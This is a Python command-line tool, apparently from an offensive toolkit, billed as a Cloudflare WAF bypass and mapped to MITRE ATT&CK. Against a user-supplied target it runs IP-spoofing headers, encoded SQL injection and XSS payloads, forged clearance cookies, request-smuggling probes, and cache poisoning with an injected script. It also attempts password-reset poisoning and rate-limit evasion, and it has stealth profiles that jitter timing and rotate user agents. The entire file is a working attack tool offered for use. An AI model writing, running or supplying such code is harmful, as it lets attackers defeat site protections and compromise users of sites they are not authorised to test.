#!/usr/bin/env python3
"""
Cloudflare WAF Bypass Tool

MITRE ATT&CK Mapping:
  T1203 - Exploitation for Client Execution
  T1059 - Command and Scripting Interpreter
  T1190 - Exploit Public-Facing Application

Tests IP rotation, JS challenge simulation, rate-limit fuzzing, and encoding
bypass techniques against Cloudflare-protected targets.
"""

import argparse
import json
import os
import random
import signal
import sys
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from colorama import Fore, Style, init

_PIPELINE = os.path.abspath(os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..', '..', 'pipeline'))
if _PIPELINE not in sys.path:
    sys.path.insert(0, _PIPELINE)
try:
    from modules import opsec
except ImportError:
    import opsec

init(autoreset=True)
SHOULD_EXIT = False

BANNER = f"""{Fore.CYAN}
  ____ _       __ _       ___ _ _   _        ___ _ __ ___  ___ ___
 / ___| |     / /| |     |_ _| | | | |     / _ \\ '_ ` _ \\/ __/ __|
| |   | |    / / | |      | || | | | |    |  __/ | | | | \\__ \\__ \\
| |___| |___/ /  | |___   | || |_| | |___  \\___|_| |_| |_|___/___/
\\____|_____/_/   |_____|___|\\___/|_____|
{Fore.RESET}"""


def signal_handler(sig, frame):
    global SHOULD_EXIT
    SHOULD_EXIT = True
    print(f"\n{Fore.YELLOW}[!] Interrupted.{Style.RESET_ALL}")
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

OPSEC_PROFILE = None


def _profile():
    return OPSEC_PROFILE if OPSEC_PROFILE is not None else opsec.DEFAULT


def _session():
    global _OPSEC_SESSION
    try:
        return _OPSEC_SESSION
    except NameError:
        _OPSEC_SESSION = opsec.http_session(_profile())
        try:
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        except Exception:
            pass
        return _OPSEC_SESSION


def _send(method, url, timeout_sec, headers=None, data=None, params=None, cookies=None):
    """Throttled request through the opsec session. Returns (response, error)."""
    try:
        resp = opsec.throttled(_session(), url, method=method, profile=_profile(),
                               headers=headers, data=data, params=params,
                               cookies=cookies or {}, timeout=timeout_sec)
    except requests.Timeout:
        return None, "timeout"
    except requests.RequestException:
        return None, "request_failed"
    if resp is None or getattr(resp, "status_code", 0) == 0:
        return None, "request_failed"
    return resp, None


def do_get(url, timeout_sec, extra_headers=None, cookies=None, params=None):
    resp, _err = _send("GET", url, timeout_sec, headers=extra_headers, cookies=cookies, params=params)
    return resp


def do_method(method, url, timeout_sec, extra_headers=None):
    """Non-GET/POST verbs (HEAD etc.) paced via opsec primitives."""
    headers = {"User-Agent": opsec.next_ua(_profile())}
    if extra_headers:
        headers.update(extra_headers)
    opsec.sleep_jitter(_profile())
    sess = _session()
    try:
        return sess.request(method, url, headers=headers, timeout=timeout_sec)
    except AttributeError:  # urllib shim fallback speaks GET/POST only
        return sess.get(url, headers=headers, timeout=timeout_sec)
    except requests.RequestException:
        return None


def _canary_host():
    return f"pwn-{random.randint(1000000, 9999999)}.example"


def _canary_token():
    return f"pwn{random.randint(10000000, 99999999)}"


def _reflected(resp, token):
    if resp is None or not token:
        return False
    if token in (resp.text or ""):
        return True
    try:
        return any(token in str(v) for v in (resp.headers or {}).values())
    except Exception:
        return False


def target_reachable(url):
    resp = do_get(url, 10)
    return resp is not None and resp.status_code < 500


def technique_ip_rotation(url, timeout_sec):
    results = []
    headers_pool = [
        {"X-Forwarded-For": "127.0.0.1"}, {"X-Forwarded-For": "10.0.0.1"},
        {"CF-Connecting-IP": "127.0.0.1"}, {"CF-Connecting-IP": "203.0.113.50"},
        {"True-Client-IP": "127.0.0.1"}, {"True-Client-IP": "198.51.100.25"},
        {"X-Real-IP": "127.0.0.1"}, {"X-Originating-IP": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"}, {"X-Client-IP": "127.0.0.1"},
        {"X-Host": "127.0.0.1"},
    ]
    baseline = do_get(url, timeout_sec)
    if baseline is None:
        return [{"technique": "ip_rotation", "detail": "baseline_failed", "bypassed": False}]
    bl_len = len(baseline.text)
    for h in headers_pool:
        if SHOULD_EXIT:
            break
        resp = do_get(url, timeout_sec, extra_headers=h)
        if resp is None:
            results.append({"technique": "ip_rotation", "headers": str(h), "bypassed": False, "error": "request_failed"})
        else:
            diff = abs(len(resp.text) - bl_len)
            bypassed = resp.status_code == 200 and (diff > 50 or resp.status_code != baseline.status_code)
            results.append({"technique": "ip_rotation", "headers": str(h), "status": resp.status_code, "bypassed": bypassed})
    return results


def technique_encoding_bypass(url, timeout_sec):
    patterns = [
        ("URL SQLi", "' OR '1'='1"), ("Double URL SQLi", "%2527%2520OR%2520%25271%2527%253D%25271"),
        ("Unicode SQLi", "' OR '1'='1"), ("Mixed XSS", "<sCript>alert(1)</sCript>"),
        ("URL XSS", "%3Cscript%3Ealert(1)%3C%2Fscript%3E"), ("Double URL XSS", "%253Cscript%253Ealert(1)%253C%252Fscript%253E"),
        ("Null SQLi", "' OR '1'='1'%00"), ("Case SQLi", "UnIoN SeLeCt 1,2,3"),
        ("Hex SQLi", "0x27204f52202731273d27"),
    ]
    results = []
    for label, payload in patterns:
        if SHOULD_EXIT:
            break
        resp = do_get(url, timeout_sec, params={"id": payload})
        if resp is None:
            results.append({"technique": "encoding_bypass", "label": label, "bypassed": False, "error": "request_failed"})
        else:
            body = resp.text.lower()
            reflected = payload.lower()[:20] in body if len(payload) > 5 else False
            sql_err = any(kw in body for kw in ["sql", "mysql", "syntax", "unclosed", "quotation"])
            bypassed = resp.status_code == 200 and (reflected or sql_err)
            results.append({"technique": "encoding_bypass", "label": label, "status": resp.status_code, "bypassed": bypassed})
    return results


def technique_rate_fuzzing(url, timeout_sec):
    results = []
    for delay in [1.0, 0.5, 0.2, 0.1, 0.05]:
        if SHOULD_EXIT:
            break
        statuses = []
        for _ in range(5):
            resp = do_get(url, timeout_sec)
            statuses.append(resp.status_code if resp else 0)
            time.sleep(delay)
        ok = sum(1 for s in statuses if s == 200)
        results.append({"technique": "rate_fuzzing", "delay": delay, "statuses": statuses, "bypassed": ok >= 3})
    return results


def technique_js_challenge(url, timeout_sec):
    results = []
    cookies_list = [
        {"cf_clearance": "simulated_clearance_token_abc123"},
        {"cf_clearance": "bypass_dummy_value"},
        {"__cfduid": "dummy", "cf_clearance": "test_clearance"},
    ]
    for ck in cookies_list:
        if SHOULD_EXIT:
            break
        resp = do_get(url, timeout_sec, cookies=ck)
        if resp is None:
            results.append({"technique": "js_challenge", "cookies": str(ck), "bypassed": False, "error": "request_failed"})
        else:
            bypassed = resp.status_code == 200 and "Just a moment" not in resp.text
            results.append({"technique": "js_challenge", "cookies": str(ck), "status": resp.status_code, "bypassed": bypassed})
    return results


def technique_header_smuggling(url, timeout_sec):
    """CL.TE / TE.TE desync and hop-header probes (attack-request-smuggling).

    Sends the ambiguous length/transfer header sets expressible through
    requests and flags responses diverging from the GET baseline."""
    results = []
    if not _profile().allows_aggressive:
        return [{"technique": "header_smuggling", "label": "skipped_quiet_profile", "bypassed": False}]
    baseline = do_get(url, timeout_sec)
    if baseline is None:
        return [{"technique": "header_smuggling", "detail": "baseline_failed", "bypassed": False}]
    bl_len = len(baseline.text)
    vectors = [
        ("te_chunked_empty", {"Transfer-Encoding": "chunked"}, None),
        ("cl_te_conflict", {"Content-Length": "0", "Transfer-Encoding": "chunked"}, None),
        ("te_te_xchunked", {"Transfer-Encoding": "xchunked"}, None),
        ("te_space_suffix", {"Transfer-Encoding ": "chunked"}, None),
        ("te_duplicate_trailing", {"Transfer-Encoding": "chunked", "Transfer-Encoding ": "identity"}, None),
        ("cl_duplicate_trailing", {"Content-Length": "0", "Content-Length ": "12"}, "x"),
        ("cl_partial_chunk_body", {"Transfer-Encoding": "chunked"}, "1\r\nA\r\nX"),
        ("te_cl_prefixed_body", {"Content-Length": "0", "Transfer-Encoding": "chunked"}, "8\r\npwnprobe\r\n0\r\n\r\n"),
        ("xff_desync_hint", {"X-Forwarded-For": "127.0.0.1", "X-Forwarded-Host": "localhost"}, None),
    ]
    for label, headers, body in vectors:
        if SHOULD_EXIT:
            break
        try:
            resp = opsec.throttled(_session(), url, method="POST", profile=_profile(),
                                   headers=headers, data=body, timeout=timeout_sec)
        except requests.Timeout:
            results.append({"technique": "header_smuggling", "label": label, "bypassed": False, "error": "timeout_desync_hint"})
            continue
        except requests.RequestException:
            results.append({"technique": "header_smuggling", "label": label, "bypassed": False, "error": "request_failed"})
            continue
        if resp is None or getattr(resp, "status_code", 0) == 0:
            results.append({"technique": "header_smuggling", "label": label, "bypassed": False, "error": "request_failed"})
            continue
        diff = abs(len(resp.text) - bl_len)
        bypassed = resp.status_code == 200 and (diff > 50 or resp.status_code != baseline.status_code)
        results.append({"technique": "header_smuggling", "label": label, "status": resp.status_code, "bypassed": bypassed})
    return results


def technique_cache_poisoning(url, timeout_sec):
    """Unkeyed-header cache poisoning probes (attack-cache-poison).

    Fingerprints cache behavior, hunts unkeyed headers with benign canaries,
    then attempts payload poisoning only when the profile allows aggression."""
    results = []
    baseline = do_get(url, timeout_sec)
    if baseline is None:
        return [{"technique": "cache_poisoning", "detail": "baseline_failed", "bypassed": False}]
    cache_headers = ["cf-cache-status", "age", "x-cache", "cache-control", "vary", "cf-ray"]
    found = [f"{k}={baseline.headers.get(k)}" for k in cache_headers if baseline.headers.get(k)]
    results.append({"technique": "cache_poisoning",
                    "label": "cache_fingerprint:" + (",".join(found) if found else "none"),
                    "status": baseline.status_code, "bypassed": False})
    host = _canary_host()
    token = _canary_token()
    probes = [
        ("x_forwarded_host", {"X-Forwarded-Host": host}, host),
        ("x_forwarded_scheme", {"X-Forwarded-Scheme": "nothttps"}, None),
        ("x_forwarded_port", {"X-Forwarded-Port": "1337"}, None),
        ("x_original_url", {"X-Original-URL": "/" + token}, token),
        ("x_rewrite_url", {"X-Rewrite-URL": "/" + token}, token),
        ("x_http_method_override", {"X-HTTP-Method-Override": "GET"}, None),
    ]
    had_location = bool(baseline.headers.get("Location"))
    for label, headers, marker in probes:
        if SHOULD_EXIT:
            break
        resp = do_get(url, timeout_sec, extra_headers=headers)
        if resp is None:
            results.append({"technique": "cache_poisoning", "label": label, "bypassed": False, "error": "request_failed"})
            continue
        reflected = _reflected(resp, marker)
        redirected = (not had_location) and bool(resp.headers.get("Location"))
        results.append({"technique": "cache_poisoning", "label": label, "status": resp.status_code,
                        "bypassed": reflected or redirected})
    ptoken = _canary_token()
    resp = do_get(url, timeout_sec, params={"cb": ptoken})
    if resp is None:
        results.append({"technique": "cache_poisoning", "label": "unkeyed_param_cb", "bypassed": False, "error": "request_failed"})
    else:
        results.append({"technique": "cache_poisoning", "label": "unkeyed_param_cb", "status": resp.status_code,
                        "bypassed": ptoken in (resp.text or "")})
    if _profile().allows_aggressive:
        payload = host + '"><script>alert(1)</script>'
        resp = do_get(url, timeout_sec, extra_headers={"X-Forwarded-Host": payload})
        if resp is None:
            results.append({"technique": "cache_poisoning", "label": "payload_xfh_script", "bypassed": False, "error": "request_failed"})
        else:
            results.append({"technique": "cache_poisoning", "label": "payload_xfh_script", "status": resp.status_code,
                            "bypassed": "alert(1)" in (resp.text or "")})
            if "alert(1)" in (resp.text or ""):
                clean = do_get(url, timeout_sec)
                results.append({"technique": "cache_poisoning", "label": "cached_reflection_confirmed",
                                "status": clean.status_code if clean else 0,
                                "bypassed": clean is not None and "alert(1)" in (clean.text or "")})
    else:
        results.append({"technique": "cache_poisoning", "label": "payload_skipped_quiet", "bypassed": False})
    return results


def technique_host_header(url, timeout_sec):
    """Host header variation probes (attack-host-header).

    Duplicate-Host via trailing-space name, port/userinfo injection and
    forwarded-host substitutes; bypass = injected marker reflected back."""
    results = []
    baseline = do_get(url, timeout_sec)
    if baseline is None:
        return [{"technique": "host_header", "detail": "baseline_failed", "bypassed": False}]
    bl_len = len(baseline.text)
    parsed = urllib.parse.urlparse(url)
    original = parsed.netloc
    host = _canary_host()
    vectors = [
        ("host_override", {"Host": host}, host),
        ("host_port_injection", {"Host": f"{original}:1337"}, "1337"),
        ("host_userinfo_injection", {"Host": f"{original}@{host}"}, host),
        ("host_trailing_space", {"Host ": host}, host),
        ("x_forwarded_host", {"X-Forwarded-Host": host}, host),
        ("x_host", {"X-Host": host}, host),
        ("x_forwarded_server", {"X-Forwarded-Server": host}, host),
        ("x_http_host_override", {"X-HTTP-Host-Override": host}, host),
        ("forwarded_header", {"Forwarded": f"host={host}"}, host),
        ("x_original_url_admin", {"X-Original-URL": "/admin"}, "/admin"),
    ]
    for label, headers, marker in vectors:
        if SHOULD_EXIT:
            break
        resp = do_get(url, timeout_sec, extra_headers=headers)
        if resp is None:
            results.append({"technique": "host_header", "label": label, "bypassed": False, "error": "request_failed"})
            continue
        diff = abs(len(resp.text) - bl_len)
        reflected = _reflected(resp, marker)
        bypassed = resp.status_code == 200 and (reflected or diff > 50 or resp.status_code != baseline.status_code)
        results.append({"technique": "host_header", "label": label, "status": resp.status_code, "bypassed": bypassed})
    if any(p in (parsed.path or "").lower() for p in ("forgot", "reset", "password")):
        if _profile().allows_aggressive:
            resp, err = _send("POST", url, timeout_sec, headers={"X-Forwarded-Host": host},
                              data={"email": "pwncanary@example.com"})
            if resp is None:
                results.append({"technique": "host_header", "label": "reset_poison", "bypassed": False,
                                "error": err or "request_failed"})
            else:
                results.append({"technique": "host_header", "label": "reset_poison", "status": resp.status_code,
                                "bypassed": host in (resp.text or "")})
        else:
            results.append({"technique": "host_header", "label": "reset_poison_skipped_quiet", "bypassed": False})
    return results


def technique_rate_endpoint_variation(url, timeout_sec):
    """Endpoint/method rate-limit bypass (attack-rate-limit-bypass).

    Engages the limiter with baseline requests, then varies path casing,
    separators, cache-busting query params and HTTP methods."""
    results = []
    parsed = urllib.parse.urlparse(url)
    path = parsed.path or "/"
    query = parsed.query
    base = f"{parsed.scheme}://{parsed.netloc}{path}" + (f"?{query}" if query else "")
    baseline_statuses = []
    for _ in range(3):
        if SHOULD_EXIT:
            break
        resp = do_get(base, timeout_sec)
        baseline_statuses.append(resp.status_code if resp else 0)
    segments = [s for s in path.split("/") if s]
    upper_path = "/" + "/".join(s.upper() for s in segments) if segments else "/"
    title_path = "/" + "/".join(s[:1].upper() + s[1:] for s in segments) if segments else "/"
    clean_path = path.rstrip("/") or "/"

    def variant_url(new_path):
        return f"{parsed.scheme}://{parsed.netloc}{new_path}" + (f"?{query}" if query else "")

    variants = [
        ("path_case_upper", variant_url(upper_path)),
        ("path_case_title", variant_url(title_path)),
        ("trailing_slash", variant_url(clean_path + "/")),
        ("trailing_dot", variant_url(clean_path + "/.")),
        ("double_slash", variant_url(path.replace("/", "//"))),
        ("semicolon_js", variant_url(clean_path + ";.js")),
        ("query_bust_epoch", base + (("&_=" if query else "?_=") + str(int(time.time())))),
        ("query_bust_rand", base + (("&cb=" if query else "?cb=") + _canary_token())),
        ("method_head", None),
        ("method_post_empty", None),
    ]
    for label, vurl in variants:
        if SHOULD_EXIT:
            break
        if label == "method_head":
            resp = do_method("HEAD", base, timeout_sec)
        elif label == "method_post_empty":
            resp, _err = _send("POST", base, timeout_sec)
        else:
            resp = do_get(vurl, timeout_sec)
        if resp is None:
            results.append({"technique": "rate_endpoint_variation", "label": label, "bypassed": False, "error": "request_failed"})
        else:
            results.append({"technique": "rate_endpoint_variation", "label": label, "status": resp.status_code,
                            "bypassed": resp.status_code == 200})
    return results


def run_techniques(url, timeout_sec, threads):
    print(f"\n{Fore.CYAN}[*] Target: {url}{Style.RESET_ALL}")
    if not target_reachable(url):
        print(f"{Fore.RED}[X] Target unreachable.{Style.RESET_ALL}")
        return []
    all_results = []
    techniques = [
        ("IP Rotation", technique_ip_rotation),
        ("Encoding Bypass", technique_encoding_bypass),
        ("Rate Fuzzing", technique_rate_fuzzing),
        ("JS Challenge", technique_js_challenge),
        ("Header Smuggling", technique_header_smuggling),
        ("Cache Poisoning", technique_cache_poisoning),
        ("Host Header", technique_host_header),
        ("Rate Endpoint Variation", technique_rate_endpoint_variation),
    ]
    workers = threads if _profile().allows_aggressive else 1
    with ThreadPoolExecutor(max_workers=workers) as ex:
        fmap = {ex.submit(fn, url, timeout_sec): name for name, fn in techniques}
        for f in as_completed(fmap):
            name = fmap[f]
            try:
                res = f.result()
                all_results.extend(res)
                b = sum(1 for r in res if r.get("bypassed"))
                print(f"{Fore.GREEN}[+] {name}: {b}/{len(res)} bypassed{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[X] {name} failed: {e}{Style.RESET_ALL}")
    return all_results


def print_report(results):
    if not results:
        return
    bypassed = [r for r in results if r.get("bypassed")]
    print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  CLOUDFLARE BYPASS | total={len(results)} bypassed={len(bypassed)}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    for r in bypassed:
        d = r.get("label") or r.get("headers") or r.get("cookies") or str(r.get("delay", ""))
        print(f"  {Fore.GREEN}[BYPASS] {r['technique']} | {d}{Style.RESET_ALL}")
    safe = [r for r in results if not r.get("bypassed")][:10]
    for r in safe:
        d = r.get("label") or r.get("headers") or r.get("cookies") or str(r.get("delay", ""))
        err = r.get("error", "")
        print(f"  {Fore.YELLOW}[BLOCKED] {r['technique']} | {d}{' (' + err + ')' if err else ''}{Style.RESET_ALL}")


def main():
    global OPSEC_PROFILE
    parser = argparse.ArgumentParser(description="Cloudflare WAF Bypass — MITRE T1203, T1059, T1190")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-t", "--timeout", type=int, default=10, help="Request timeout")
    parser.add_argument("--threads", type=int, default=4, help="Max threads")
    parser.add_argument("-o", "--output", help="Save JSON output")
    noise = parser.add_mutually_exclusive_group()
    noise.add_argument("--quiet", dest="profile", action="store_const", const="quiet",
                       help="QUIET: 2.0s+-1.0s delay, fixed UA, no aggressive checks")
    noise.add_argument("--moderate", dest="profile", action="store_const", const="moderate",
                       help="MODERATE: 0.5s+-0.25s delay, rotating UA (default)")
    noise.add_argument("--loud", dest="profile", action="store_const", const="loud",
                       help="LOUD: no artificial delay, full parallelism")
    parser.set_defaults(profile="moderate")
    args = parser.parse_args()
    OPSEC_PROFILE = opsec.Profile(args.profile)
    opsec.apply(OPSEC_PROFILE)
    os.system("cls" if os.name == "nt" else "clear")
    print(BANNER)
    results = run_techniques(args.url, args.timeout, args.threads)
    print_report(results)
    if args.output and results:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(f"\n{Fore.CYAN}[*] Saved to {args.output}{Style.RESET_ALL}")
    print(f"\n{Fore.CYAN}[*] {sum(1 for r in results if r.get('bypassed'))} bypasses found.{Style.RESET_ALL}")


if __name__ == "__main__":
    main()
